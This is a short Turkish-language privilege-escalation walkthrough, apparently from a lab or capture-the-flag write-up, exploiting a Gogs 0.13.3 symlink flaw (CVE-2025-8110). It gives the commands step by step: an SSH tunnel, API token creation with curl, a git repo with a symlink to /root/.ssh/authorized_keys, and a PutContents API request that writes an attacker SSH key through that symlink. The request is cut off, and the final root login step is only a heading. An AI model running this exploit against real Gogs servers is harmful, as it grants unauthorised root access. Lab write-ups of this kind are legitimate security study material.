[ Privilege Escalation - CVE-2025-8110 Gogs Symlink Bypass ]

Gogs 0.13.3, 127.0.0.1:3001 üzerinde çalışıyor ve root olarak çalışıyor.
SSH tüneli kuruyoruz:

    ssh -fN -L 8080:127.0.0.1:3001 ben@ip

Gogs kayıt captcha gerektiriyor ama CSRF+captcha ile kayıt olunabiliyor.
Kayıt sonrası API token oluşturuyoruz:

    curl -u "pwner:Pwner123!" -X POST http://127.0.0.1:8080/api/v1/users/pwner/tokens \
      -H "Content-Type: application/json" -d '{"name":"exploit"}'

    Token: *

CVE-2025-8110 exploit adımları:

1. Yerel git repo'da /root/.ssh/authorized_keys'e işaret eden sembolik link:

    git init exploit_repo && cd exploit_repo
    ln -sf /root/.ssh/authorized_keys link.txt
    git add -A && git commit -m "symlink"
    git push http://pwner:Pwner123!@127.0.0.1:8080/pwner/pwn.git master

2. Gogs API'sine PutContents isteği:
   (Gogs root olarak çalıştığından symlink'i takip edip hedef dosyaya yazıyor)

      -H "Authorization: token *" \
      -H "Content-Type: application/json" \
      -d '{"message":"update","content":"<base64_ssh_pub_key>","sha":"<blob_sha>"}'

3. SSH as root:
